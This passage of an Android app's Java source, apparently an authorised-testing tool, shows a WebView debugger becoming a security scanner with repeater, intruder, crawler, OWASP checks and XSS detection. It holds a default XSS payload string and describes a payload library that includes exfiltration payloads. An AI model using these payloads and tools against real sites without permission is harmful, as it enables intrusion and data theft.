package com.zapia.debugbrowser;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.webkit.CookieManager;
import android.webkit.ConsoleMessage;
import android.webkit.JsPromptResult;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.HorizontalScrollView;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import com.airbnb.lottie.LottieAnimationView;
import com.airbnb.lottie.LottieComposition;
import com.airbnb.lottie.LottieCompositionFactory;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;

public class MainActivity extends Activity {
    private WebView webView;
    private EditText address, filterInput;
    private LinearLayout panelContent;
    private TextView status;
    private String activePanel = "CONSOLA";
    private final List<String> consoleRecords = new ArrayList<>();
    private final List<String> networkRecords = new ArrayList<>();
    private final List<String> cdpNetworkRecords = new ArrayList<>();
    private static final int MAX_RECORDS = 400;
    // Rendimiento del panel: antes cada evento de red/consola reconstruía el
    // panel completo en el hilo principal (hasta 400 TextView + re-parsear el
    // Lottie de 526 KB en cada repintado), lo que congelaba la app al cargar
    // páginas con muchos recursos. Ahora los repintados se agrupan, se limita
    // el número de filas dibujadas y el Lottie se parsea una sola vez.
    private static final int MAX_RENDERED_ROWS = 100;
    private static final long RENDER_DEBOUNCE_MS = 120;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private final Runnable renderRunnable = new Runnable() {
        @Override public void run() { renderPending = false; renderPanel(); }
    };
    private boolean renderPending;
    // Animaciones Lottie: en v1.1 se reutilizaba una única vista por animación
    // y los paneles dejaron de funcionar (solo quedaba la consola). La vista
    // reutilizada se desmontaba y volvía a montar en cada repintado, con la
    // composición cargándose de forma asíncrona entre medias. Ahora cada
    // repintado crea una vista nueva, como en v1.0, y lo que se cachea es la
    // composición ya parseada, así no se vuelve a parsear el JSON de 526 KB.
    private LottieComposition loadingComposition;
    private LottieComposition emptyComposition;
    private boolean loadingCompositionRequested;
    private boolean emptyCompositionRequested;
    private float lastTouchX, lastTouchY;
    private CdpNetworkClient cdpNetworkClient;
    private String jsExpression = "";
    private String jsBundlesSummary;
    private String jsBundlesJson;
    private java.util.ArrayList<String> jsPayloadLabels = new java.util.ArrayList<>();
    private java.util.ArrayList<String> jsPayloadValues = new java.util.ArrayList<>();
    private String jsSinkResults;
    private boolean jsSinkAnalyzing;
    private java.util.ArrayList<String[]> jsSinkFindings = new java.util.ArrayList<>();
    private java.util.LinkedHashMap<String, java.util.ArrayList<String>> dnsResults = new java.util.LinkedHashMap<>();
    private java.util.HashSet<String> dnsExpanded = new java.util.HashSet<>();
    private boolean dnsResolving;
    // OWASP (v1.7): canario, cobertura, caracteres, WAF, CSP y cookies.
    private String canaryToken = "testxss9988";
    private String canaryResults;
    private String canarySearchTarget;
    private String probeResults;
    private String wafResults;
    private String cspResults;
    private String cookieResults;
    private java.util.HashSet<String> owaspExpanded = new java.util.HashSet<>();
    private String coverageInputsJson;
    private boolean coverageDiscovering;
    private java.util.ArrayList<String> coverageFormFields = new java.util.ArrayList<>();
    private java.util.ArrayList<String> coverageGetParams = new java.util.ArrayList<>();
    private java.util.ArrayList<String> coverageCookies = new java.util.ArrayList<>();
    private java.util.ArrayList<String> coverageJsonFields = new java.util.ArrayList<>();
    private java.util.HashSet<String> coverageTested = new java.util.HashSet<>();
    private java.util.LinkedHashMap<String, String> coverageResults = new java.util.LinkedHashMap<>();
    private String coveragePageKey;
    private String coveragePendingTest;
    private String coveragePendingKind;
    private String coveragePendingPageKey;
    private String coverageUaBackup;
    private String pageSinkResults;
    private int jsSinkPayloadCount;
    private java.util.ArrayList<String> jsPayloadContexts = new java.util.ArrayList<>();
    private String xssTestContext;
    private java.util.LinkedHashMap<String, Integer> contextTests = new java.util.LinkedHashMap<>();
    private java.util.LinkedHashMap<String, Integer> contextHits = new java.util.LinkedHashMap<>();
    private java.util.LinkedHashMap<String, Integer> canaryContextCounts = new java.util.LinkedHashMap<>();
    private int lastHttpErrorCode;
    private String lastHttpErrorUrl;
    private int lastHttpErrorSeq;
    private String lastNetworkError;
    private int lastNetworkErrorSeq;
    private int wafErrSeq;
    private int wafNetSeq;
    private boolean wafChecking;
    private boolean cspAnalyzing;
    // Repetidor y Decodificador estilo Burp (v1.9).
    private String repeaterMethod = "GET";
    private String repeaterUrl = "";
    private java.util.ArrayList<String[]> repeaterParams = new java.util.ArrayList<>();
    private String repeaterHeaders = "";
    private String repeaterBody = "";
    private String repeaterResult;
    private boolean repeaterSending;
    private java.util.ArrayList<String[]> repeaterRecent = new java.util.ArrayList<>();
    private String decoderInput = "";
    private String decoderOutput;
    // Escaneo automático y autollenado (v2.0).
    private boolean scanRunning;
    private boolean scanAwaitingDiscover;
    private java.util.ArrayList<String> scanSteps = new java.util.ArrayList<>();
    private int scanStepIndex;
    private int scanStepId;
    private int scanCurrentId;
    private String scanStatus;
    private java.util.ArrayList<String> scanFindings = new java.util.ArrayList<>();
    private int scanReflected;
    private int scanVuln;
    private java.util.LinkedHashMap<String, String> coverageContexts = new java.util.LinkedHashMap<>();
    private String autofillResults;
    // Reorganización v3.0: la app deja de ser un depurador genérico y pasa
    // a ser una herramienta de pruebas de seguridad. Pestañas: Consola,
    // Solicitudes, Repetidor, OWASP, JS, Recon, VPN y Reporte.
    private java.util.HashSet<String> reconExpanded = new java.util.HashSet<>();
    private String repeaterView = "rep";
    // Intruso (v3.0).
    private String intruderParam = "";
    private String intruderList = "xss";
    private String intruderCustom = "";
    private boolean intruderRunning;
    private java.util.ArrayList<String[]> intruderResults = new java.util.ArrayList<>();
    private java.util.ArrayList<String> intruderFindings = new java.util.ArrayList<>();
    private int intruderBaselineStatus = -1;
    private int intruderBaselineLength = -1;
    private String intruderStatus;
    private String intruderLastBody;
    // Mapa del sitio y tecnologías (v3.0, Recon).
    private boolean crawlRunning;
    private java.util.ArrayList<String[]> crawlResults = new java.util.ArrayList<>();
    private String crawlStatus;
    private String techResults;
    private boolean techAnalyzing;
    // Cabeceras de seguridad (v3.0).
    private String securityHeadersResults;
    private String xssPayload = "<img src=x onerror=alert('XSS')>";
    private String xssTestResult;
    private String xssAlertText;
    private boolean xssTestActive;

    /** Repintado agrupado para fuentes de alta frecuencia (red, consola, CDP). */
    private void requestRender() {
        if (renderPending) return;
        renderPending = true;
        uiHandler.postDelayed(renderRunnable, RENDER_DEBOUNCE_MS);
    }

    /** Repintado inmediato para acciones directas del usuario. */
    private void renderNow() {
        uiHandler.removeCallbacks(renderRunnable);
        renderPending = false;
        renderPanel();
    }

    @Override public void onCreate(Bundle state) {
        super.onCreate(state);
        buildUi();
        WebView.setWebContentsDebuggingEnabled(BuildConfig.DEBUG);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient() {
            @Override public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) { return false; }
            @Override public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
                WebResourceResponse response = super.shouldInterceptRequest(view, request);
                if (request != null) {
                    String method = request.getMethod();
                    String url = request.getUrl().toString();
                    String resource = request.isForMainFrame() ? "DOCUMENTO" : "RECURSO";
                    String result = response == null ? "Estado HTTP no expuesto por WebView" : ("HTTP " + response.getStatusCode() + " " + response.getMimeType());
                    addNetwork(String.format(Locale.US, "%s  %s  %s\n%s", method, resource, url, result));
                    synchronized (repeaterRecent) {
                        repeaterRecent.add(new String[]{method, url});
                        while (repeaterRecent.size() > 50) repeaterRecent.remove(0);
                    }
                }
                return response;
            }
            @Override public void onPageFinished(WebView view, String url) {
                address.setText(url);
                status.setText("Listo");
                addConsole("INFO", "Página cargada: " + url, "browser");
                // Pruebas OWASP que esperan a que la página cargue (canario,
                // sonda de caracteres o WAF): se completan 1,2 s después.
                if (coveragePendingTest != null) {
                    final String pending = coveragePendingTest;
                    final String kind = coveragePendingKind;
                    webView.postDelayed(() -> {
                        if (coveragePendingTest == null || !coveragePendingTest.equals(pending)) return;
                        coveragePendingTest = null;
                        coveragePendingKind = null;
                        if ("waf".equals(kind)) completeWafCheck(pending);
                        else if ("probe".equals(kind)) analyzeProbeChars(pending);
                        else if ("scanpayload".equals(kind)) completeScanPayload(pending);
                        else completeCanarySearch(pending);
                    }, 1200);
                }
                String key = pageCoverageKey();
                if (coveragePendingTest == null && key != null && coveragePageKey != null && !coveragePageKey.equals(key)) clearCoverageState();
                if (key != null) coveragePageKey = key;
            }
            // Errores del marco principal: 403 y cortes de conexión que
            // delatan un WAF o una regla de bloqueo activo.
            @Override public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
                if (request != null && request.isForMainFrame() && errorResponse != null) {
                    lastHttpErrorCode = errorResponse.getStatusCode();
                    lastHttpErrorUrl = request.getUrl().toString();
                    lastHttpErrorSeq++;
                }
            }
            @Override public void onReceivedError(WebView view, WebResourceRequest request, android.webkit.WebResourceError error) {
                if (request != null && request.isForMainFrame() && error != null) {
                    lastNetworkError = error.getDescription() == null ? "Error de red" : error.getDescription().toString();
                    lastNetworkErrorSeq++;
                }
            }
        });
        webView.setWebChromeClient(new WebChromeClient() {
            @Override public boolean onConsoleMessage(ConsoleMessage message) {
                addConsole(message.messageLevel().name(), message.message(), message.sourceId() + ":" + message.lineNumber());
                return true;
            }
            // Durante una prueba XSS los diálogos se capturan en vez de
            // mostrarse, para detectar la ejecución sin bloquear la interfaz.
            @Override public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
                if (xssTestActive) { xssAlertText = message; result.confirm(); return true; }
                return super.onJsAlert(view, url, message, result);
            }
            @Override public boolean onJsConfirm(WebView view, String url, String message, JsResult result) {
                if (xssTestActive) { xssAlertText = message; result.confirm(); return true; }
                return super.onJsConfirm(view, url, message, result);
            }
            @Override public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) {
                if (xssTestActive) { xssAlertText = message; result.confirm(""); return true; }
                return super.onJsPrompt(view, url, message, defaultValue, result);
            }
            @Override public void onProgressChanged(WebView view, int progress) {
                status.setText(progress < 100 ? "Cargando " + progress + "%" : "Listo");
            }
        });
        webView.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_UP) { lastTouchX = event.getX(); lastTouchY = event.getY(); }
            return false;
        });
        if (BuildConfig.DEBUG) {
            cdpNetworkClient = new CdpNetworkClient(Process.myPid(), new CdpNetworkClient.Listener() {
                @Override public void onStatus(String message) { addConsole("CDP", message, "cdp-network"); }
                @Override public void onNetworkRecord(String record) { addCdpNetwork(record); }
            });
            cdpNetworkClient.start();
        }
        webView.loadUrl("https://example.com");
    }

    private void buildUi() {
        LinearLayout root = new LinearLayout(this); root.setOrientation(LinearLayout.VERTICAL); root.setBackgroundColor(Color.rgb(20, 23, 29));
        // Android 15+ (targetSdk 35) impone edge-to-edge: sin esto la barra
        // superior (‹ › URL Ir) queda dibujada bajo la barra de estado y no
        // se puede tocar ni leer. Se aplica el inset de las barras del
        // sistema como padding del raíz, arriba y abajo.
        root.setOnApplyWindowInsetsListener((v, insets) -> {
            v.setPadding(v.getPaddingLeft(), insets.getSystemWindowInsetTop(), v.getPaddingRight(), insets.getSystemWindowInsetBottom());
            return insets;
        });
        LinearLayout bar = new LinearLayout(this); bar.setGravity(Gravity.CENTER_VERTICAL); bar.setPadding(dp(4), dp(4), dp(4), dp(4));
        Button back = button("‹"); back.setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
        Button forward = button("›"); forward.setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
        address = new EditText(this); address.setSingleLine(true); address.setTextColor(Color.WHITE); address.setHintTextColor(Color.LTGRAY); address.setHint("URL o búsqueda"); address.setTextSize(14); address.setPadding(dp(9), 0, dp(9), 0); address.setBackgroundColor(Color.rgb(43, 48, 58)); address.setImeOptions(EditorInfo.IME_ACTION_GO);
        address.setOnEditorActionListener((v, actionId, event) -> { if (actionId == EditorInfo.IME_ACTION_GO) { navigate(address.getText().toString()); return true; } return false; });
        Button go = button("Ir"); go.setOnClickListener(v -> navigate(address.getText().toString()));
        bar.addView(back, new LinearLayout.LayoutParams(dp(38), dp(44))); bar.addView(forward, new LinearLayout.LayoutParams(dp(38), dp(44))); bar.addView(address, new LinearLayout.LayoutParams(0, dp(44), 1)); bar.addView(go, new LinearLayout.LayoutParams(dp(44), dp(44))); root.addView(bar);

        webView = new WebView(this); root.addView(webView, new LinearLayout.LayoutParams(-1, 0, 1));
        LinearLayout tools = new LinearLayout(this); tools.setGravity(Gravity.CENTER_VERTICAL); tools.setPadding(dp(3), 0, dp(3), 0); tools.setBackgroundColor(Color.rgb(15,17,21));
        addTool(tools, "CONSOLA", "Consola"); addTool(tools, "RED", "Solicitudes"); addTool(tools, "REPETIDOR", "Repetidor");
        addTool(tools, "OWASP", "OWASP"); addTool(tools, "JS", "JS y bundles"); addTool(tools, "RECON", "Recon");
        addTool(tools, "VPN", "VPN"); addTool(tools, "REPORTE", "Reporte");
        HorizontalScrollView toolScroll = new HorizontalScrollView(this); toolScroll.setHorizontalScrollBarEnabled(false); toolScroll.addView(tools); root.addView(toolScroll, new LinearLayout.LayoutParams(-1, dp(42)));

        LinearLayout panel = new LinearLayout(this); panel.setOrientation(LinearLayout.VERTICAL); panel.setBackgroundColor(Color.rgb(15,17,21));
        LinearLayout header = new LinearLayout(this); header.setGravity(Gravity.CENTER_VERTICAL); header.setPadding(dp(8), dp(2), dp(5), dp(2));
        TextView title = new TextView(this); title.setText("Inspector"); title.setTextColor(Color.WHITE); title.setTextSize(13);
        status = new TextView(this); status.setText("Listo"); status.setTextColor(Color.LTGRAY); status.setTextSize(11); status.setGravity(Gravity.RIGHT | Gravity.CENTER_VERTICAL);
        header.addView(title, new LinearLayout.LayoutParams(0, dp(32), 1)); header.addView(status, new LinearLayout.LayoutParams(dp(100), dp(32))); panel.addView(header);
        filterInput = new EditText(this); filterInput.setSingleLine(true); filterInput.setTextColor(Color.WHITE); filterInput.setHintTextColor(Color.LTGRAY); filterInput.setHint("Filtrar registros"); filterInput.setTextSize(12); filterInput.setPadding(dp(8), 0, dp(8), 0); filterInput.setBackgroundColor(Color.rgb(43,48,58));
        filterInput.addTextChangedListener(new android.text.TextWatcher() { public void beforeTextChanged(CharSequence s,int st,int c,int a){} public void onTextChanged(CharSequence s,int st,int before,int count){ requestRender(); } public void afterTextChanged(android.text.Editable e){} });
        panel.addView(filterInput, new LinearLayout.LayoutParams(-1, dp(36)));
        ScrollView scroll = new ScrollView(this); panelContent = new LinearLayout(this); panelContent.setOrientation(LinearLayout.VERTICAL); panelContent.setPadding(dp(8), dp(3), dp(8), dp(8)); scroll.addView(panelContent); panel.addView(scroll, new LinearLayout.LayoutParams(-1, dp(150)));
        LinearLayout actions = new LinearLayout(this); actions.setGravity(Gravity.RIGHT);
        Button clear = button("Borrar"); clear.setTextSize(11); clear.setOnClickListener(v -> clearRecords());
        Button export = button("Exportar"); export.setTextSize(11); export.setOnClickListener(v -> exportRecords());
        actions.addView(clear, new LinearLayout.LayoutParams(dp(72), dp(34))); actions.addView(export, new LinearLayout.LayoutParams(dp(80), dp(34))); panel.addView(actions);
        root.addView(panel); setContentView(root); root.requestApplyInsets(); renderNow();
    }

    private void addTool(LinearLayout row, String key, String label) {
        Button b = button(label); b.setTextSize(10); b.setOnClickListener(v -> { activePanel = key; filterInput.setVisibility(key.equals("CONSOLA") || key.equals("RED") ? View.VISIBLE : View.GONE); renderNow(); });
        row.addView(b, new LinearLayout.LayoutParams(dp(92), dp(38)));
    }

    private void navigate(String raw) {
        String input = raw.trim(); if (input.isEmpty()) return; String url;
        if (input.matches("^[a-zA-Z][a-zA-Z0-9+.-]*://.*")) url = input;
        else if (input.contains(".") && !input.contains(" ")) url = "https://" + input;
        else url = "https://www.google.com/search?q=" + Uri.encode(input);
        jsBundlesSummary = null;
        jsBundlesJson = null;
        jsPayloadLabels.clear();
        jsPayloadValues.clear();
        jsSinkResults = null;
        jsSinkAnalyzing = false;
        jsSinkFindings.clear();
        dnsResults.clear();
        dnsExpanded.clear();
        dnsResolving = false;
        crawlResults.clear();
        crawlStatus = null;
        techResults = null;
        xssTestResult = null;
        xssTestActive = false;
        clearCoverageState();
        webView.loadUrl(url); status.setText("Cargando…");
    }

    private void addConsole(String level, String message, String source) {
        String entry = String.format(Locale.US, "[%s] %s\n%s", level, message, source);
        runOnUiThread(() -> { appendLimited(consoleRecords, entry); if (activePanel.equals("CONSOLA")) requestRender(); });
    }
    private void addNetwork(String entry) {
        synchronized (networkRecords) { appendLimited(networkRecords, entry); }
        runOnUiThread(() -> { if (activePanel.equals("RED")) requestRender(); });
    }
    private void appendLimited(List<String> records, String entry) { synchronized (records) { if (records.size() >= MAX_RECORDS) records.remove(0); records.add(entry); } }

    private void renderPanel() {
        if (panelContent == null) return;
        panelContent.removeAllViews();
        if (activePanel.equals("VPN")) {
            showVpnPanel();
        } else if (activePanel.equals("JS")) {
            showJsPanel();
        } else if (activePanel.equals("OWASP")) {
            showOwaspPanel();
        } else if (activePanel.equals("REPETIDOR")) {
            showRepeaterPanel();
        } else if (activePanel.equals("RECON")) {
            showReconPanel();
        } else if (activePanel.equals("REPORTE")) {
            showReportPanel();
        } else if (activePanel.equals("RED")) {
            showToolView("Solicitudes", BuildConfig.DEBUG ? "CAPTURANDO" : "LIMITADO", "Vista independiente de Network CDP: requestId, método, URL, status, tipo y timing.", "0 solicitudes", "0 errores", "0 B");
            renderCdpNetworkRecords();
        } else {
            List<String> records = activePanel.equals("RED") ? networkRecords : consoleRecords;
            String query = filterInput.getText().toString().toLowerCase(Locale.ROOT);
            boolean hasQuery = !query.isEmpty();
            int shown = 0;
            boolean truncated = false;
            synchronized (records) {
                for (int i = records.size()-1; i >= 0; i--) {
                    if (shown >= MAX_RENDERED_ROWS) { truncated = true; break; }
                    String entry = records.get(i);
                    // Sin filtro no se paga el toLowerCase() de cada registro.
                    if (hasQuery && !entry.toLowerCase(Locale.ROOT).contains(query)) continue;
                    int color = entry.contains("ERROR") ? Color.rgb(255,120,120) : entry.contains("WARNING") || entry.contains("WARN") ? Color.rgb(255,205,100) : Color.rgb(215,220,230);
                    addPanelText(entry, color);
                    shown++;
                }
            }
            if (truncated) addPanelText("Mostrando los " + MAX_RENDERED_ROWS + " registros más recientes. Usa el filtro o Borrar para reducir la lista.", Color.LTGRAY);
        }
    }
    private void addPanelText(String text, int color) { TextView row = new TextView(this); row.setText(text); row.setTextSize(11); row.setTextColor(color); row.setPadding(dp(4), dp(5), dp(4), dp(5)); panelContent.addView(row); }

    private void addCdpNetwork(String record) {
        synchronized (cdpNetworkRecords) { appendLimited(cdpNetworkRecords, record); }
        runOnUiThread(() -> { if (activePanel.equals("RED")) requestRender(); });
    }

    private void renderCdpNetworkRecords() {
        synchronized (cdpNetworkRecords) {
            if (cdpNetworkRecords.isEmpty()) {
                addPanelText("CDP aún no ha recibido eventos de Network.", Color.LTGRAY);
                return;
            }
            addPanelText("Eventos CDP Network · " + cdpNetworkRecords.size(), Color.rgb(105, 205, 255));
            int shown = 0;
            for (int i = cdpNetworkRecords.size() - 1; i >= 0 && shown < MAX_RENDERED_ROWS; i--) {
                addPanelText(cdpNetworkRecords.get(i), Color.rgb(215, 220, 230));
                shown++;
            }
            if (cdpNetworkRecords.size() > MAX_RENDERED_ROWS) addPanelText("Mostrando los " + MAX_RENDERED_ROWS + " eventos más recientes.", Color.LTGRAY);
        }
    }

    private void showToolView(String title, String state, String description, String metricOne, String metricTwo, String metricThree) {
        addPanelText(title + "   •   " + state, Color.rgb(105, 205, 255));
        addPanelText(description, Color.LTGRAY);
        // La animación es decorativa: si falla, el panel se muestra sin ella.
        if (state.equals("CAPTURANDO") || state.equals("PENDIENTE CDP") || state.equals("NORMAL")) {
            try { panelContent.addView(lottie(R.raw.browserdebug_loading), new LinearLayout.LayoutParams(-1, dp(68))); } catch (Exception ignored) { }
        } else if (state.equals("SIN DATOS") || state.equals("SIN CONEXIONES") || state.equals("SELECCIONA")) {
            try { panelContent.addView(lottie(R.raw.browserdebug_empty_state), new LinearLayout.LayoutParams(-1, dp(82))); } catch (Exception ignored) { }
        }
        addPanelText("────────────────────────\n" + metricOne + "\n" + metricTwo + "\n" + metricThree, Color.rgb(215, 220, 230));
    }

    /**
     * Vista nueva en cada repintado, como en v1.0. La composición parseada se
     * cachea aparte (se pide una sola vez por animación): los repintados
     * siguientes usan setComposition() con la composición ya lista, sin
     * volver a parsear el JSON de loading (526 KB).
     */
    private LottieAnimationView lottie(int rawResource) {
        LottieAnimationView animation = new LottieAnimationView(this);
        boolean isLoading = rawResource == R.raw.browserdebug_loading;
        LottieComposition cached = isLoading ? loadingComposition : emptyComposition;
        if (cached != null) {
            animation.setComposition(cached);
        } else {
            animation.setAnimation(rawResource);
            boolean requested = isLoading ? loadingCompositionRequested : emptyCompositionRequested;
            if (!requested) {
                if (isLoading) loadingCompositionRequested = true; else emptyCompositionRequested = true;
                LottieCompositionFactory.fromRawRes(this, rawResource)
                        .addListener(composition -> { if (isLoading) loadingComposition = composition; else emptyComposition = composition; });
            }
        }
        animation.setRepeatCount(-1);
        animation.setScaleType(ImageView.ScaleType.CENTER_INSIDE);
        animation.setBackgroundColor(Color.TRANSPARENT);
        animation.playAnimation();
        return animation;
    }

    // VPN y Zero Trust: BrowserDebug no incrusta su propio túnel VPN (eso
    // exigiría un VpnService y duplicar el cliente WireGuard). Integra las
    // apps oficiales: Tailscale (com.tailscale.ipn) y Cloudflare One Agent
    // (com.cloudflare.cloudflareoneagent, el cliente Zero Trust actual; el
    // inicio de sesión Zero Trust en la app 1.1.1.1 ya no se admite).
    private static final String TAILSCALE_PACKAGE = "com.tailscale.ipn";
    private static final String CLOUDFLARE_ONE_PACKAGE = "com.cloudflare.cloudflareoneagent";
    private static final String WARP_PACKAGE = "com.cloudflare.onedotonedotonedotone";

    private void showVpnPanel() {
        addPanelText("VPN y Zero Trust", Color.rgb(105, 205, 255));
        addPanelText("BrowserDebug usa las apps oficiales como túnel; aquí solo se controla y se comprueba su estado.", Color.LTGRAY);

        addPanelText("Tailscale", Color.WHITE);
        boolean tailscaleInstalled = isAppInstalled(TAILSCALE_PACKAGE);
        if (!tailscaleInstalled) {
            addPanelText("No instalado. Instálalo e inicia sesión con tu tailnet para poder conectar.", Color.rgb(255, 205, 100));
            addPanelButton("Instalar Tailscale", v -> openAppOrInstall(TAILSCALE_PACKAGE));
        } else {
            boolean connected = isTailscaleConnected();
            addPanelText("Estado: " + (connected ? "CONECTADO (IP 100.64.0.0/10 detectada)" : "DESCONECTADO"), connected ? Color.rgb(105, 205, 150) : Color.LTGRAY);
            if (connected) {
                addPanelButton("Desconectar Tailscale", v -> { sendTailscaleCommand("com.tailscale.ipn.DISCONNECT_VPN"); Toast.makeText(this, "Desconectando Tailscale…", Toast.LENGTH_SHORT).show(); });
            } else {
                addPanelButton("Conectar Tailscale", v -> { sendTailscaleCommand("com.tailscale.ipn.CONNECT_VPN"); Toast.makeText(this, "Conectando Tailscale… pulsa Actualizar estado en unos segundos.", Toast.LENGTH_SHORT).show(); });
            }
            addPanelButton("Abrir Tailscale", v -> openAppOrInstall(TAILSCALE_PACKAGE));
            addPanelText("Requiere haber iniciado sesión en Tailscale y aceptado el permiso VPN al menos una vez.", Color.LTGRAY);
        }
        addPanelButton("Actualizar estado", v -> renderNow());

        addPanelText("Cloudflare Zero Trust", Color.WHITE);
        addPanelText("El cliente Zero Trust actual es Cloudflare One Agent. El alta en tu equipo se hace dentro de esa app; si tu equipo aún no existe, primero hay que activar Access en el panel de Cloudflare.", Color.LTGRAY);
        if (isAppInstalled(CLOUDFLARE_ONE_PACKAGE)) {
            addPanelButton("Abrir Cloudflare One", v -> openAppOrInstall(CLOUDFLARE_ONE_PACKAGE));
        } else {
            addPanelButton("Instalar Cloudflare One", v -> openAppOrInstall(CLOUDFLARE_ONE_PACKAGE));
        }
        addPanelText("WARP básico (1.1.1.1) no es Zero Trust: solo cifra el tráfico, sin acceso a tu equipo.", Color.LTGRAY);
        addPanelButton(isAppInstalled(WARP_PACKAGE) ? "Abrir 1.1.1.1 (WARP)" : "Instalar 1.1.1.1 (WARP)", v -> openAppOrInstall(WARP_PACKAGE));
    }

    private void addPanelButton(String label, View.OnClickListener listener) {
        Button b = button(label); b.setOnClickListener(listener); panelContent.addView(b);
    }

    private boolean isAppInstalled(String pkg) {
        try { return getPackageManager().getLaunchIntentForPackage(pkg) != null; } catch (Exception e) { return false; }
    }

    /** Tailscale asigna IPs en 100.64.0.0/10; si hay una interfaz con una, el túnel está activo. */
    private boolean isTailscaleConnected() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                Enumeration<InetAddress> addresses = interfaces.nextElement().getInetAddresses();
                while (addresses.hasMoreElements()) {
                    byte[] ip = addresses.nextElement().getAddress();
                    if (ip.length == 4 && (ip[0] & 0xff) == 100 && (ip[1] & 0xff) >= 64 && (ip[1] & 0xff) <= 127) return true;
                }
            }
        } catch (Exception ignored) { }
        return false;
    }

    /** Broadcast documentado de Tailscale para conectar/desconectar su VPN. */
    private void sendTailscaleCommand(String action) {
        Intent intent = new Intent(action);
        intent.setClassName(TAILSCALE_PACKAGE, TAILSCALE_PACKAGE + ".IPNReceiver");
        try { sendBroadcast(intent); } catch (Exception e) { Toast.makeText(this, "No se pudo enviar la orden a Tailscale", Toast.LENGTH_SHORT).show(); }
    }

    private void openAppOrInstall(String pkg) {
        Intent launch = getPackageManager().getLaunchIntentForPackage(pkg);
        if (launch != null) { startActivity(launch); return; }
        try {
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + pkg)));
        } catch (Exception e) {
            try { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + pkg))); }
            catch (Exception ignored) { Toast.makeText(this, "No se pudo abrir Play Store", Toast.LENGTH_SHORT).show(); }
        }
    }

    // JavaScript y bundles: evalúa expresiones JS en la página actual y
    // analiza los bundles JS cargados (Resource Timing: URL, tamaño
    // transferido y duración). La expresión escrita se conserva en
    // jsExpression porque el panel se reconstruye en cada repintado.
    private void showJsPanel() {
        addPanelText("JavaScript y bundles", Color.rgb(105, 205, 255));
        addPanelText("Evalúa JavaScript en la página actual y revisa los bundles JS que cargó.", Color.LTGRAY);

        addPanelText("Resolver JavaScript", Color.WHITE);
        EditText jsInput = new EditText(this);
        jsInput.setSingleLine(false);
        jsInput.setTextColor(Color.WHITE);
        jsInput.setHintTextColor(Color.LTGRAY);
        jsInput.setHint("Ej.: document.title");
        jsInput.setTextSize(12);
        jsInput.setPadding(dp(8), dp(6), dp(8), dp(6));
        jsInput.setBackgroundColor(Color.rgb(43, 48, 58));
        jsInput.setText(jsExpression);
        jsInput.addTextChangedListener(new android.text.TextWatcher() {
            public void beforeTextChanged(CharSequence s, int st, int c, int a) { }
            public void onTextChanged(CharSequence s, int st, int before, int count) { jsExpression = s.toString(); }
            public void afterTextChanged(android.text.Editable e) { }
        });
        panelContent.addView(jsInput, new LinearLayout.LayoutParams(-1, dp(72)));
        addPanelButton("Ejecutar JS", v -> runJsExpression());
        addPanelText("Inspeccionar elemento", Color.WHITE);
        addPanelButton("Inspeccionar elemento tocado", v -> inspectTouchedElement());

        addPanelText("Bundles JavaScript", Color.WHITE);
        addPanelButton("Analizar bundles JS", v -> analyzeJsBundles());
        if (jsBundlesSummary != null) addPanelText(jsBundlesSummary, Color.rgb(215, 220, 230));
        else addPanelText("Aún no se han analizado los bundles de esta página.", Color.LTGRAY);

        addPanelText("Payloads desde bundles", Color.WHITE);
        addPanelText("Genera payloads XSS a partir de las librerías detectadas en los bundles escaneados (por nombre en la URL), de los sumideros encontrados en su contenido y de payloads genéricos basados en eventos. Toca uno para probarlo directamente.", Color.LTGRAY);
        addPanelButton("Generar payloads desde bundles", v -> generatePayloadsFromBundles());
        for (int i = 0; i < jsPayloadLabels.size(); i++) {
            final String value = jsPayloadValues.get(i);
            final String context = i < jsPayloadContexts.size() ? jsPayloadContexts.get(i) : null;
            addPanelButton((i + 1) + " · " + jsPayloadLabels.get(i), v -> { xssPayload = value; xssTestContext = context; testXssPayload(); });
        }
        if (jsBundlesJson != null && jsPayloadValues.isEmpty()) addPanelText("Aún no se han generado payloads para estos bundles.", Color.LTGRAY);

        addPanelText("Biblioteca de payloads", Color.WHITE);
        addPanelText("127 payloads curados de tres repositorios públicos (theWeborion/xss-bypass-techniques, pgaijin66/XSS-Payloads y hakluke/weaponised-XSS-payloads). Toca una categoría y luego un payload para probarlo directamente. Los marcados (clic), (ratón) o (tecla) necesitan interacción, y los de exfiltración no disparan alert: solo sirven con un servidor de escucha propio.", Color.LTGRAY);
        for (String cat : xssLibraryCategories()) {
            final String c = cat;
            addPanelButton((libraryCategory.equals(c) ? "● " : "") + c + " (" + xssLibraryByCategory(c).size() + ")", v -> { libraryCategory = c; renderNow(); });
        }
        for (String[] row : xssLibraryByCategory(libraryCategory)) {
            final String value = row[2];
            final String tag = row[1];
            final String context = detectPayloadContext(value);
            String label = value.length() > 80 ? value.substring(0, 80) + "…" : value;
